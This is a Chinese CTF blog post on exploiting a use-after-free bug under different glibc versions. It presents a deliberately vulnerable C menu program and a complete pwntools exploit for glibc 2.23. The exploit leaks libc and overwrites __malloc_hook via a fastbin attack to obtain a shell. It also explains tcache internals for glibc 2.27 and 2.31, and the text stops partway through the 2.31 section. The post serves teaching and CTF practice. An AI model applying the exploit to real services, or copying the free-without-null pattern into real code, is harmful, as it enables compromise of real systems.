<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="不同版本Glibc下的UAF漏洞利用"><meta name="keywords" content="pwn,ptmalloc2,safe-linking,libc-2.32"><meta name="author" content="Alex"><meta name="copyright" content="Alex"><title>不同版本Glibc下的UAF漏洞利用 | Alex's blog~</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-23"><span class="toc-number">1.</span> <span class="toc-text">2.23</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">利用手法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-27"><span class="toc-number">2.</span> <span class="toc-text">2.27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-31"><span class="toc-number">3.</span> <span class="toc-text">2.31</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95-1"><span class="toc-number">3.1.</span> <span class="toc-text">利用手法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">3.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-32"><span class="toc-number">4.</span> <span class="toc-text">2.32</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">4.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%9F%E8%B8%AA%E8%B0%83%E8%AF%95"><span class="toc-number">4.2.</span> <span class="toc-text">跟踪调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#free%E8%BF%87%E7%A8%8B"><span class="toc-number">4.2.1.</span> <span class="toc-text">free过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#malloc%E8%BF%87%E7%A8%8B"><span class="toc-number">4.2.2.</span> <span class="toc-text">malloc过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95-2"><span class="toc-number">4.3.</span> <span class="toc-text">利用手法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">4.4.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-5cb1e2bdc0644f9828029a94181f4542_1440w.jpg"></div><div class="author-info__name text-center">Alex</div><div class="author-info__description text-center">aboutme:  /about/</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">22</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">24</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">2</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://n0vice.top/">N0vice</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://snowywar.top/">魔法少女雪殇</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://l0ne1y.xyz/">L0ne1y</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alex's blog~</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">不同版本Glibc下的UAF漏洞利用</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-18</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>​    由于现在CTF比赛中，pwn方向涉及的libc版本众多，不同版本之间的堆块在组织方式上都有差别，刚开始学习的堆的朋友们大多数都是从最经典的UAF来入手的，本文来通过同一个UAF的demo程序，来来大家交流学习下下不同版本libc下的利用手法。</p>
<p>​    程序源码如下，给出了较为宽松的堆块编辑方式和组织方式，方便讨论利用手法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> sizearray[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">char</span> *heaparray[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;choice&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">20</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    size = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; size &lt; <span class="number">0x500</span>)</span><br><span class="line">        sizearray[i] = size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="built_in">malloc</span>(size);</span><br><span class="line">    heaparray[i] = p;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (heaparray[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, heaparray[i], sizearray[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (heaparray[i])</span><br><span class="line">        <span class="built_in">puts</span>(heaparray[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, temp, <span class="number">8</span>);</span><br><span class="line">    i = atoi(temp);</span><br><span class="line">    <span class="keyword">if</span> (heaparray[i])</span><br><span class="line">        <span class="built_in">free</span>(heaparray[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choice;</span><br><span class="line">    myinit();</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">1</span>)</span><br><span class="line">            add();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">2</span>)</span><br><span class="line">            edit();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">delete</span> ();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">4</span>)</span><br><span class="line">            show();</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">5</span>)</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><h3 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h3><p>​    2.23的UAF是比较经典的利用手法了，此时libc还没有引入tcache结构，仅仅通过fastbin来管理较小的chunk，在libc2.23下可以利用fastbin attack来攻击__malloc_hook来getshell。</p>
<p>​    具体步骤，是先通过申请一个属于unsorted bin大小的堆块，利用UAF+binary的show功能来泄露libc的基地址，再通过uaf申请满足fastbin大小的chunk，并修改其fd指针，将__malloc_hook周围满足检查的地址链到fastbin中，再次申请相同大小的chunk即可将其取出，修改为one_gadget即可getshell。</p>
<p>​    修改__malloc_hook的原因是在__libc_malloc中会先于分配过程检查__malloc_hook是否为空，若不为空则调用。__malloc_hook在首次malloc的时候会用作初始化相关的工作来使用，往后其值为0，因为在从fastbin中取chunk的过程中会检查size是否合法，所以要在__malloc_hook周围找出一块合法的地址，经验来说，在__malloc_hook - 0x23的位置处有一个合法的size位，可以用来伪造chunk。</p>
<p><img src="https://i.loli.net/2021/05/18/PyaVxfZnKAY7mNk.png" style="zoom:50%;" /></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>​    泄露LIBC地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment"># 申请0x10防止在free 0x100的时候该chunk与top chunk合并</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x10</span>, <span class="string">&#x27;protect&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x30</span>, <span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="comment"># 这里也可以不用申请一个chunk，毕竟有UAF，可以直接show</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">344</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br></pre></td></tr></table></figure>
<p>​    fastbin attack</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 申请0x60的chunk可以来对应到__malloc_hook-0x23处的size</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 修改fastbin的fd指针</span></span><br><span class="line">edit(<span class="number">0</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">og = libc_base + <span class="number">0xd5bf7</span></span><br><span class="line"><span class="comment"># 申请到__malloc_hook - 0x23，覆写hook的值为one_gadget</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="number">0x13</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/05/18/ocSeuN2OasW7Tjn.png" style="zoom:50%;" /></p>
<p>​    完整exp如下仅供参考，由于整个程序在堆块编辑的过程中限制很宽松，大家可以自己写出更多种exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./UAF_glibc2.23&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== LEAK LIBC ADDRESS =======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x10</span>, <span class="string">&#x27;protect&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x30</span>, <span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">344</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== FASTBIN ATTACK =======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">og = libc_base + <span class="number">0xd5bf7</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="number">0x13</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== TRIGGER MALLOC HOOK =======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2-27"><a href="#2-27" class="headerlink" title="2.27"></a>2.27</h2><p>​    libc2.27在更新后，malloc源码发生了变化，基本上和libc2.31的源码一样，引入了key指针来避免double free，所以我们在2.27下的利用手法和2.31下的利用手法基本一致，直接篡改key指针即可绕过检查。</p>
<p>​    在老版libc下关于tcache的俩结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<p>​    从tcache中拿堆块的函数tcache_get()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    free后放入tcache中的函数tcache_put()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    tcache bin和fastbin的管理方式很像，都采用FILO的单链表（理解为数据结构中的栈），但是tcache的优先级更高，并且在bin中，fastbin的fd指针指向上一个chunk的头部，而tcache会指向上一个chunk的数据部分。</p>
<p>​    旧版libc2.27中，tcache结构体没有引入key指针，可以随意double free，在UAF下，使得利用手法更为容易，并且在分配的过程中没有对size进行检查，所以在旧版libc2.27下很常见的一种利用手法就是填满tcache后，申请unsorted bin大小的chunk利用UAF进行地址泄露，利用tcache随意double free的特性来修改__free_hook指针为one<em>gadget，原理同\</em>_malloc_hook。</p>
<p>​    现在比赛中涉及libc2.27的一般都会换上新版的libc，新版libc2.27的部分我们到2.31处再进行讨论。</p>
<h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><h3 id="利用手法-1"><a href="#利用手法-1" class="headerlink" title="利用手法"></a>利用手法</h3><p>​    在libc2.31中，我们查看tcache的相关结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="comment">// 新引入了key指针</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">// 这个位置很有趣，在libc2.27中的数据结构是char一个字节，libc2.31被更新为uint16_t类型为2个字节了</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<p>​    从tcache中拿堆块的函数tcache_get()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="comment">// 取出时将key字段设置为NULL</span></span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    free后放入tcache中的函数tcache_put()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
